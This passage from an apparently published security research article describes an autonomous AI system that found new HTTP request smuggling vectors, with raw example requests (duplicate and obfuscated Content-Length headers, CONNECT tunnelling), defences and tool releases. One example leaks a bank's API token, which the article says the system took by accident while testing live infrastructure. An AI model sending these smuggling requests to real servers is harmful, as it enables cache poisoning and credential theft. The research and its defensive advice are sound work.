+q='sanitized</span><span class="orangeHighlighter">\\x&lt;</span><span class="oceanblue">'</span></code></span><h3><a id="shared-parser-confusion">Shared-Parser Confusion</a></h3><p>The critical breakthrough came when the system analyzed one of the many <span class="code">Content-Type: multipart/byteranges</span>&nbsp;discoveries and made the following observation:</p><blockquote><p>That rule was written for responses. A parser that shares code between requests and responses will misapply it to requests.</p></blockquote><p>It intermittently made the connection to:</p><blockquote><p>any response-processing feature could be exploited by a request</p></blockquote><p>In other words, servers are using shared code to parse both requests and responses, so the attack-surface you can hit isn't limited to request features. That, by itself, is absolutely huge.</p><p>This has implications well beyond desync attacks, and explains some mysterious behavior I've seen in the past, such as servers processing the Set-Cookie header in requests.&nbsp;Any time you land a major research discovery, there's a scary moment when you google it to see if someone else beat you to the concept. </p><p>The closest published technique I could find is <a href="https://x.com/orange_8361">Orange Tsai</a>'s&nbsp;Location <a href="/web-security/ssrf">SSRF</a> chain on Apache in <a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-en/#:~:text=We%20turned%20to%20RFC%203875%20for%20a%20rescue%21%20RFC%203875%20is%20a%20specification%20about%20CGI%2C%20and%20Section%206%2E2%2E2%20defines%20a%20Local%20Redirect%20Response%20behavior">Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server</a>&nbsp;- luckily for me the overlap is only partial, and he was so focused on destroying Apache than he didn't generalize it into an attack class that works across completely different servers. </p><p>I regard Shared Parser Confusion as one of the most significant discoveries of this research. </p><h3><a id="scanning-for-inspiration">Scanning for inspiration</a></h3><p>The last cascade I'd like to share was kicked off by the HTTP Terminator achieving RQP on a live site running a product by Beyond Trust, inspired by this RFC line:</p><blockquote><p>Any 2xx response to a CONNECT request implies that the connection will become a tunnel… a client MUST ignore any&nbsp;Content-Length&nbsp;or&nbsp;Transfer-Encoding&nbsp;header fields.</p></blockquote><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">CONNECT / HTTP/2
+Host: redacted
+
+X</span></code><code class="theme-white white-space-pre"><span class="green">GET / HTTP/2</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">HTTP/2 501 Not Implemented
+
+XGET not supported</span></code></span><p>The underlying server flaw was present in many Beyond Trust products, including "Beyond Trust Secure Remote Access". However, it was only exploitable when they were deployed behind a front-end that forwards <span class="code">CONNECT</span>&nbsp;requests. The HTTP Terminator was lucky to discover such a system. </p><p>Beyond Trust asked how they could replicate the underlying flaw with a direct request to the flawed server, and as I designed an approach, I realized this could be valuable to me too. Such a scenario wouldn't be exploitable, but if you think about the earlier cascades, some findings that were basically useless on their own ended up being crucial links in the discovery cascade to something else. </p><p>Here's two probes - the first is harmless, and the second shows risky behavior. It's impossible to tell the difference by looking at the responses - the difference is in the probes themselves. </p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">GET / HTTP/1.1
+Host: example.com
+Content</span><span class="orangeHighlighter">_</span><span class="oceanblue">Length: 5
+
+X Y Z</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">HTTP/1.1 200 OK
+Connection: keep-alive
+
+HTTP/1.1 400 Bad Request</span></code></span><span class="container-code"><code class="theme-white white-space-pre"><span class="orangeHighlighter">get</span><span class="oceanblue"> / HTTP/1.1
+Host: bank-4
+Content-Length: 5
+
+X Y Z</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">HTTP/1.1 400 Bad Request
+Akamai-Cache-Status: Error…
+Connection: keep-alive
+…
+HTTP/1.0 400 Bad Request</span></code></span><p>Both probes have triggered two responses, but that's standard HTTP/1.1 behavior when the server thinks you've sent two requests. The first probe has an ambiguous body length, so it's unsurprising that the server has interpreted it as two requests. </p><p>The second probe is what I call "clean" - it's RFC-compliant, and unambiguously a single request. If a request is dirty, it's hard to reliably infer anything useful from how a server responds to it. But when a clean request gets two responses, that's interesting since it's highly likely that other servers will interpret it as a single request. </p><p>I updated the anomaly detection layer to flag when a clean request triggered two responses, and instantly flagged this on a Meta server. </p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">GET / HTTP/1.1
+Host: redacted.meta.com
+Content-Length: 2147483648
+Content-Length: 5
+
+X Y Z</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">HTTP/1.1 302 Found
+…
+HTTP/1.1 Bad Request</span></code></span><p>This vector was inspired by RFC 1945 §4.2:</p><blockquote><p>Multiple HTTP-header fields with the same field-name may be present in a message if and only if the entire field-value for that header field is defined as a comma-separated list</p></blockquote><p>The request was only marked as clean thanks to a bug, but manual investigation revealed extremely interesting behavior from the server. It was treating the request as though the content-length was zero when presented with two content-lengths... even when they were both matching, valid and correct. I mentioned this vector to my collaborators from last year - <a href="https://x.com/sw33tLie">Paolo 'sw33tLie' Arnolfo</a>&nbsp;and <a href="https://www.linkedin.com/in/francesco-mariani-85841b1b3">Mariani 'Medusa' Francesco</a>&nbsp;- who kicked off a scan with it, and were able to exploit a juicy SSO server.</p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">GET / HTTP/1.1
+Host: sso.redacted.com
+Content-Length: 28
+Content-Length: 28
+
+GET /x </span><span class="orangeHighlighter">HTTP/5.1</span><span class="oceanblue">
+X: X</span></code><code class="theme-white white-space-pre"><span class="green">GET / HTTP/1.1</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">HTTP/1.1 505 HTTP Version Not Supported</span></code></span><p>This left me wondering why the HTTP Terminator hadn't already found and compromised the SSO server, and delving in revealed a bug in my evaluation harness which was breaking all requests with dual matching CL headers. Fixing that unleashed a flood of vectors the HTTP Terminator had invented months earlier.</p><p>I opened my laptop in the morning to discover the HTTP Terminator had found one of those vectors worked on most of the public infrastructure of a particular bank, and, while developing an RQP proof of concept, accidentally stolen a long-lived API key belonging to that bank:</p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">GET /styles.css HTTP/1.1
+Host: redacted-bank.com 
+Content-Length: 35
+X: Y
+ Content-Length: 35
+
+GET /styles.css HTTP/1.1
+Host: redacted-bank.com</span></code><code class="theme-community-6 white-space-pre"><span class="orange">HTTP/1.1 200 OK
+Content-Type: application/json
+Content-Length: 254
+
+{
+    "createdTime":"2024-03-29",
+    "userId":"Redacted Bank",
+    "token":"f2ac…31b9"
+}</span></code></span><p>In that moment, It felt like I'd stepped into the audience for someone else's talk. The bank later informed me that they'd tracked the issue down to a misconfiguration in their Citrix NetScaler server.</p><h2><a id="conclusion">Conclusion</a></h2><h3><a id="the-blueprint">The blueprint</a></h3><p>This research was a lot of fun, and I'd highly recommend building your own autonomous research engine. </p><p>To help you get started, I've made the following blueprint which basically just outlines the order to tackle tasks in:</p><ul><li>Objective (e.g.: Discover novel race condition patterns)</li><li>Evaluation strategy (e.g.: Code review -&gt; black-box confirmation)</li><li>Inspiration sources (e.g.: StackOverflow posts containing "race")</li><li>Cascade routes (e.g.: Feed each finding back in as inspiration)</li></ul><p>Evaluation is the first concrete step for both design and implementation because any issues there will derail the entire project. Likewise, if you prefer to do manual research without a risk of collision with AI-driven researchers, I recommend picking a topic where automated evaluation is extremely difficult.</p><p>For the same reason, I'd highly recommend aggressively identifying and resolving data quality issues - these are hard to solve later on. </p><p>Also, remember you can start rapidly by using an LLM for everything, then iterate towards using deterministic code as much as possible.</p><p>If you build one, I'd love to hear how it goes.</p><h3><a id="tool-releases">Tool releases</a></h3><p>To accompany this publication, I've published:</p><ul><li>The <a href="https://github.com/portswigger/http-terminator">full source code</a>&nbsp;for the HTTP Terminator</li><li>An update to <a href="https://github.com/portswigger/http-request-smuggler">HTTP Request Smuggler</a>&nbsp;containing the most effective new vectors, and the new request-contamination detection mechanism</li><li>An update to <a href="https://github.com/portswigger/turbo-intruder">Turbo Intruder</a>&nbsp;which adds a powerful MCP interface (enabled via the settings)</li><li>An update to <a href="https://github.com/portswigger/param-miner">Param Miner</a>&nbsp;which uses the protocol-ruler technique to analyze discovered headers</li></ul><p>The latter three can be easily installed via Burp's BApp store.</p><p>Please note that the HTTP Terminator is a research factory. If you just want to quickly find desync vulnerabilities in a specific target, HTTP Request Smuggler is the tool to use. On a similar note, the HTTP Terminator has not been integrated into our new product Burp AT - it's unsuitable for deployment in a commercial product. However, lessons learned from it informed the product design, and high-value research discoveries are shipped to customers regularly via Burp AT's skill system.</p><h3><a id="defense">Defense</a></h3><p>The solution to HTTP desync attacks is to never use upstream HTTP/1.1 - always use HTTP/2 or higher. Further mitigations are <a href="https://portswigger.net/research/http1-must-die#defending-against-http-desync-attacks">covered in depth</a>&nbsp;in last year's paper HTTP/1.1 Must Die, but based on the slew of vectors discovered by the HTTP Terminator I'd add two additional recommendations for those forced to use upstream HTTP/1.1:</p><ul><li>Apply an allow-list of HTTP request methods on both the front-end and back-end server</li></ul><ul><li>Use a separate allow-list to specify which HTTP methods are allowed to have a request body. This should be limited to <span class="code">POST</span>, and possibly <span class="code">PUT</span>/<span class="code">PATCH</span>&nbsp;etc if you use those. Methods like <span class="code">GET</span>, <span class="code">HEAD</span>, <span class="code">OPTIONS</span>&nbsp;should never be accompanied by a body.</li></ul><h3><a id="takeaways">Takeaways</a></h3><p>Looking back at the original desync research goals, we can see the HTTP Terminator autonomously invented and proved:</p><ul><li>Many novel desync triggers </li><li>One novel desync pattern - dual-matching CL headers</li><li>One novel desync weaponization technique - the dangling-byte technique</li></ul><p>It also found evidence of a novel desync class - response forking - but was unable to prove it in the wild. </p><p>However, the greatest discovery was never planned for. Shared-Parser Confusion is a novel attack concept that will likely yield many more notable attacks over the following years. This discovery was not fully autonomous - the HTTP Terminator proposed it, and I validated it. Neither of us would have discovered it alone.</p><p>So, can AI do novel security research autonomously? Absolutely. A researcher can build the loop, step back, and watch the findings rain. </p><p>However, the true value of an autonomous research system is unlocked by putting a researcher in the loop in exactly one place - the discovery cascade. Autonomous cascades are viable but limited by both the evaluation system architecture, and AI model power. </p><p>In other words, humans are a massive power amplifier for AI research systems.</p><p>Good luck! If you have any questions, thoughts or ideas, <a href="https://jameskettle.com/#:~:text=Contact">feel free to reach out</a>.</p><p>James Kettle</p><p>PortSwigger Research</p>
+    <div class="container-flex-wrap">
+            <a class="label-rounded-outline-white" href="/research/black-hat">
+                Black Hat
+            </a>
+            <a class="label-rounded-outline-white" href="/research/request-smuggling">
+                Request Smuggling
+            </a>
+            <a class="label-rounded-outline-white" href="/research/ai">
+                AI
+            </a>
+    </div>
+    <p><a href="/research/articles" class="chevron-before">Back to all articles</a></p>
+</div>
+
+    <div class="section-light section-full-width theme-grey-5">
+        <noscript>
+    <div class="noscript-warning">This page requires JavaScript for an enhanced user experience.</div>
+</noscript>
+        <h2 class="text-center">Related Research</h2>
+        
+<div class="widget-tile-container margin-top-m">
+
+
+<a href="/research/css-the-bomb-inside-your-inbox" class="tile-container research onecolumn widget-tile size0 style1 textstyle2 is-whitebackground" data-backgroundimageurl=/cms/images/0e/fe/eb24-tile-tile1x1.png  data-backgroundcolorid="0">
+    
+<h3 class="tile-text1 notext2">
+CSS:the bomb inside your inbox</h3>
+    
+<span class="tile-date">06 August 2026</span>
+    
+<span class="tile-text1-alt">CSS:the bomb inside your inbox</span>
+        
+
+</a>
+
+<a href="/research/crlf-powered-desync-attacks" class="tile-container research onecolumn widget-tile size0 style1 textstyle8 is-whitebackground" data-backgroundimageurl=/cms/images/14/fe/c5f2-tile-preview.png  data-backgroundcolorid="0">
+    
+<h3 class="tile-text1 notext2">
+        <span class="tile-text-container">CRLF-Powered Desync Attacks: Beheading HTTP Streams</span>
+</h3>
+    
+<span class="tile-date">05 August 2026</span>
+    
+<span class="tile-text1-alt">CRLF-Powered Desync Attacks: Beheading HTTP Streams</span>
+        
+
+</a>
+
+<a href="/research/the-fragile-lock" class="tile-container research onecolumn widget-tile size0 style1 textstyle2 is-whitebackground" data-backgroundimageurl=/cms/images/3d/5b/62c1-tile-fragile-lock-1x1.png  data-backgroundcolorid="0">
+    
+<h3 class="tile-text1 ">
+The Fragile Lock:</h3>
+
+
+    <span class="tile-text2">
+Novel Bypasses For SAML Authentication    </span>
+    
+<span class="tile-date">10 December 2025</span>
+    
+<span class="tile-text1-alt">The Fragile Lock:</span>
+        
+        <span class="tile-text2-alt">Novel Bypasses For SAML Authentication</span>
+
+</a>
+
+<a href="/research/how-to-distinguish-http-pipelining-from-request-smuggling" class="tile-container research onecolumn widget-tile size0 style1 textstyle3 is-whitebackground" data-backgroundimageurl=/cms/images/80/07/7769-tile-http_pipelining_1x1.png  data-backgroundcolorid="0">
+    
+<h3 class="tile-text1 notext2">
+        <span class="tile-text-container">How to distinguish HTTP pipelining from request smuggling</span>
+</h3>
+    
+<span class="tile-date">19 August 2025</span>
+    
+<span class="tile-text1-alt">How to distinguish HTTP pipelining from request smuggling</span>
+        
+
+</a></div>
+
+
+    </div>
+
+
+
+<script type="application/ld&#x2B;json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "@type": "Person",
+    "name": "James Kettle"
+  },
+  "dateModified": "2026-08-06",
+  "datePublished": "2026-08-05",
+  "headline": "Can AI do novel security research? Meet the HTTP Terminator",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://portswigger.net/research/can-ai-do-novel-security-research"
+  },
+  "image":{
+    "@type": "ImageObject",
+    "url": "https://portswigger.net/cms/images/65/c9/4abd-twittercard-http_terminator_x.png"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://portswigger.net/content/images/logos/thumbnail.png"
+    },
+    "name": "PortSwigger Research",
+    "url": "https://portswigger.net/research",
+    "sameAs": [
+      "https://twitter.com/portswiggerres"
+    ]
+  },
+  "url": "https://portswigger.net/research/can-ai-do-novel-security-research"
+}
+</script>
+
+<script src="/bundles/cms/research/details.js?v=BE1g-bqV17iCwvzZzBCK3Ni1CVA" nonce="be2vxbc8HS7kAQnD7XRXGmC7j7DYZ7vs"></script>
+
+        </div>
+        <footer class="wrapper">
+    <div class="container">
+        <div>
+            <p>Burp Suite</p>
+            <a href="/burp/vulnerability-scanner">Web vulnerability scanner</a>
+            <a href="/burp">Burp Suite Editions</a>
+            <a href="/burp/releases">Release Notes</a>
+        </div>
+        <div>
+            <p>Vulnerabilities</p>
+            <a href="/web-security/cross-site-scripting">Cross-site scripting (XSS)</a>
+            <a href="/web-security/sql-injection">SQL injection</a>
+            <a href="/web-security/csrf">Cross-site request forgery</a>
+            <a href="/web-security/xxe">XML external entity injection</a>
+            <a href="/web-security/file-path-traversal">Directory traversal</a>
+            <a href="/web-security/ssrf">Server-side request forgery</a>
+        </div>
+        <div>
+            <p>Customers</p>
+            <a href="/organizations">Organizations</a>
+            <a href="/testers">Testers</a>
+            <a href="/developers">Developers</a>
+        </div>
+        <div>
+            <p>Company</p>
+            <a href="/about">About</a>
+            <a href="/careers">Careers</a>
+            <a href="/about/contact">Contact</a>
+            <a href="/legal">Legal</a>
+            <a href="/privacy">Privacy Notice</a>
+            <a href="/modern-slavery-statement">Modern Slavery Statement</a>
+        </div>
+        <div>
+            <p>Insights</p>
+            <a href="/web-security">Web Security Academy</a>
+            <a href="/blog">Blog</a>
+            <a href="/research">Research</a>
+            <a href="/engineering">Engineering</a>
+        </div>
+        <div>
+            <a href="/"><img src="/content/images/logos/portswigger-logo.svg" alt="PortSwigger Logo" class="footer-logo"></a>
+            <a class="button-outline-blue-small camelcase" href="https://twitter.com/Burp_Suite" rel="noreferrer"><span class="icon-twitter"></span>  Follow us</a>
+            <p class="grey">&copy; 2026 PortSwigger Ltd.</p>
+        </div>
+    </div>
+</footer>
+<a href="#top" class="back-to-top"><svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 26 26"><polygon points="4.07 14.7 5.03 15.78 12.48 9.13 19.94 15.78 20.9 14.7 12.48 7.2 4.07 14.7" fill="#f63" /><path d="M13,0A13,13,0,1,0,26,13,13,13,0,0,0,13,0Zm0,24.56A11.56,11.56,0,1,1,24.56,13,11.58,11.58,0,0,1,13,24.56Z" fill="#f63" /></svg></a>
+
+        <a class="back-to-top" href="#top">
+            <svg height="26" viewBox="0 0 26 26" width="26" xmlns="http://www.w3.org/2000/svg">
+                <polygon fill="#f63" points="4.07 14.7 5.03 15.78 12.48 9.13 19.94 15.78 20.9 14.7 12.48 7.2 4.07 14.7"></polygon>
+                <path d="M13,0A13,13,0,1,0,26,13,13,13,0,0,0,13,0Zm0,24.56A11.56,11.56,0,1,1,24.56,13,11.58,11.58,0,0,1,13,24.56Z" fill="#f63"></path>
+            </svg>
+        </a>
+    </body>
+</html>
